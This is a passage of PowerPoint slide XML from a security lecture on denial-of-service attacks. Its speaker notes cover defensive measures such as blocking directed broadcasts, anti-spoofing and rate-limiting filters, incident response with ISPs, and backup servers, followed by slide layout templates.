    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1859653276"/>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BC9D4C14-2860-487B-BBE2-88D5FA226E10}"/>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86139C27-8BA3-4C6F-93BD-FD74F2658830}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>178</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49155" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D84D1893-7D9D-47AD-8060-6596B489DCC5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49156" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BBADB425-1E2D-41F6-9D7C-3D9239BAA023}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The best defense against broadcast amplification attacks is to block the use of IP directed broadcasts. This can be done either by the ISP, or by any organization whose systems could potentially be used as an intermediary. As we noted earlier in this chapter, this along with anti-spoofing filters are long standing security recommendations that all organization’s ought to implement. More generally, limiting or blocking traffic to suspicious services, or combinations of source and destination ports, can restrict the types of reflection attacks that can be used against an organization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Defending against attacks on application resources generally requires modification to the applications targeted, such as web servers. Defenses may involve attempts to identify legitimate, generally human initiated, interactions from automated DoS attacks. These often take the form of a “graphical puzzle”, which is easy for most humans to solve, but difficult to automate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Beyond these direct defenses against denial of service attack mechanisms, overall good system security practices should be maintained. The aim is to ensure that your systems are not compromised and used as zombie systems. Suitable configuration and monitoring of high performance, well-connected servers, is also needed to help ensure they don’t contribute to the problem as potential intermediary servers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>If an organization is dependent on network services, they should consider mirroring and replicated these servers over multiple sites with multiple network connections. This is good general practice for high performance servers, providing greater levels of reliability and fault tolerance in general, not just as a response to these types of attack.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2820060638"/>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1A7EFF0A-AB2F-4D4A-8965-D0D7440FE493}"/>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60B9F95-14EA-46F2-B9B1-7A029B814AE6}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>179</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51203" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9CC0A42B-2360-4EB3-B012-6DE5A1492532}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51204" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6C454A9-699A-4526-B844-F703374F1BFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>In order to successfully respond to a denial of service attack, a good incident response plan is needed,  including details of how to contact technical personal for your Internet Service Provider(s). Denial of service attacks, particularly flooding attacks, can only be filtered upstream of your network connection. The plan should also contain details of how to respond to the attack. The division of responsibilities between organizational personnel and the ISP will depend on the resources available, and technical capabilities of the organization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Within an organization you should have implemented the standard anti-spoofing, directed broadcast, and rate limiting filters we discuss earlier in this chapter. Ideally, you should also have some form of automated network monitoring and intrusion detection system (IDS) running, so personnel will be notified should abnormal traffic be detected. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="699598770"/>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FF33FE9C-1558-4C4F-8385-86E92E7945A1}"/>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B4848519-F349-49EC-815A-FD7DBB6296FF}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>180</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53251" name="Rectangle 1026">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE4BED9C-2EDB-4734-B6FD-703042B3FDAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53252" name="Rectangle 1027">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{21880B48-E342-4E5B-BFFC-27ADEF85ACA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>When a denial of service attack is detected, the first step is to identify the type of attack and hence the best approach to defend against it. Typically this involves capturing packets flowing into the organization, and analyzing them looking for common attack packet types. This may be done by organizational personnel  or ISP, depending on relevant expertise. From this analysis the type of attack is identified, and suitable filters designed to block the flow of attack packets. These have to be installed by the ISP on their routers. If the attack targets a bug on a system or application, rather than high traffic volumes, then this must be identified, and steps taken to correct it to prevent future attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The organization may also wish to ask their ISP to trace the flow of packets back in an attempt to identify their source. However if spoofed sources addresses are used, this can be difficult and time-consuming. Whether this is attempted may well depend on whether the organization intends to report the attack to the relevant law enforcement agencies. In such a case, additional evidence must be collected and actions documented to support any subsequent legal action.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>In the case of an extended, concerted, attack, it may not be possible to successfully filter enough of the attack packets to restore network connectivity. In such cases the organization needs a contingency strategy to switch to alternate backup servers, or to rapidly commission new servers at a new site with new addresses, in order to restore service. Without forward planning to achieve this, the consequence of such an attack will be extended loss of network connectivity. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Following the immediate response, the organization’s incident response policy may specify further steps that are taken to respond to contingencies like this. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3772110562"/>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0F250589-636B-45F2-B780-D7A31C2297C3}"/>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6E86D22-3DEA-46C1-818A-D2D66801D4AA}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>181</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55299" name="Rectangle 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B7F743E0-6565-4470-B400-C189440F8217}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55300" name="Rectangle 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A83AC5A-69A7-41A2-844D-5468C73BA1BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Chapter 8 summary.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="243947577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0739889" y="5698672"/>
            <a:ext cx="719379" cy="1159329"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{B7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10751936" y="5683175"/>
            <a:ext cx="707333" cy="1159329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C00000"/>
          </a:solidFill>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sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2"/>
            <a:ext cx="12192000" cy="1404257"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C00000"/>
          </a:solidFill>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sz="2250" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
              <a:ea typeface="Times New Roman" charset="0"/>
              <a:cs typeface="Times New Roman" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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495" y="115250"/>
            <a:ext cx="1168989" cy="1159328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="50800" dist="38100" dir="8100000" algn="tr" rotWithShape="0">
              <a:prstClr val="black">
                <a:alpha val="40000"/>
              </a:prstClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6564086"/>
            <a:ext cx="12192000" cy="293914"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C00000"/>
          </a:solidFill>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sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix amt="5000"/>
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3533727" y="1988654"/>
            <a:ext cx="5003800" cy="4025900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3098409719"/>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a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeo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831851" y="4589465"/>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907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16238958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295400" y="410367"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1p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7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35688774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272255"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>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7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26894923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295400" y="381000"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:defRPr>
            </a:lvl1p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7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9304039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7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33431391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5183188" y="987427"/>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7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34566851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5183188" y="987427"/>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7907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40748078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219200" y="320673"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>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907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3786983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907E4F-3FBA-3F49-8ED1-FFEDFAC8B7F4}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26142629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689286033"/>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F3893A9-EE1E-8E46-A08C-4E50CC431F9E}" type="datetime1">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>30/08/2018</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>GV:Ngô Quốc Dũng - Khoa CN&amp;ANTT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{B2D129F4-C194-9C4C-B37D-DC34ACF6936D}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2261206140"/>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24000" y="381000"/>
            <a:ext cx="0" cy="0"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800"/>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:defRPr sz="1800"/>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master text styles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Second level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Third level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Fourth level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Fifth level</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15601733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4_Title Slide">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
